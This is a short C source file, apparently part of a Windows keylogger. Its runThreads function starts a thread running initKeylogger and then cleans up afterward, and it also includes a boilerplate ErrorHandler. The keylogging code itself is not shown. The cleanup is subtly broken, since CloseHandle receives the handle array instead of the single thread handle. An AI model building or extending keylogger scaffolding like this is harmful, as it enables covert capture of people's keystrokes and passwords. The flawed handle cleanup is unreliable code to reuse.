#include "manageTasks.h"

int runThreads()
{
    PMYDATA pDataArray[1];
    DWORD dwThreadIdArray[1];
    HANDLE hThread[1];

    pDataArray[0] = (PMYDATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MYDATA));

    hThread[0] = CreateThread(
        NULL,                 // default security attributes
        0,                    // use default stack size
        initKeylogger,        // thread function name
        pDataArray[0],          // argument to thread function
        0,                    // use default creation flags
        &dwThreadIdArray[0]); // returns the thread identifier

    if (hThread[0] == NULL)
    {
     //   ErrorHandler(TEXT("CreateThread"));
        ExitProcess(3);
    }



    // Wait until all threads have terminated.
    WaitForMultipleObjects(1, hThread, TRUE, INFINITE);
    // WaitForMultipleObjects(MAX_THREADS, hThreadArray, TRUE, INFINITE);

       // Close all thread handles and free memory allocations.

    for (int i = 0; i < 1; i++)
    {
        CloseHandle(hThread);
        //  CloseHandle(hThreadArray[i]);
        if (pDataArray[i] != NULL)
        {
            HeapFree(GetProcessHeap(), 0, pDataArray[i]);
            pDataArray[i] = NULL; // Ensure address is not reused.
        }
    }
    return 0;
}

void ErrorHandler(LPTSTR lpszFunction)
{
    // Retrieve the system error message for the last-error code.
    LPVOID lpMsgBuf;
    LPVOID lpDisplayBuf;
    DWORD dw = GetLastError();

    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        dw,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&lpMsgBuf,
        0, NULL);

    // Display the error message.

    lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
        (lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR));
    StringCchPrintf((LPTSTR)lpDisplayBuf,
        LocalSize(lpDisplayBuf) / sizeof(TCHAR),
        TEXT("%s failed with error %d: %s"),
        lpszFunction, dw, lpMsgBuf);
    MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

    // Free error-handling buffer allocations.

    LocalFree(lpMsgBuf);
    LocalFree(lpDisplayBuf);
}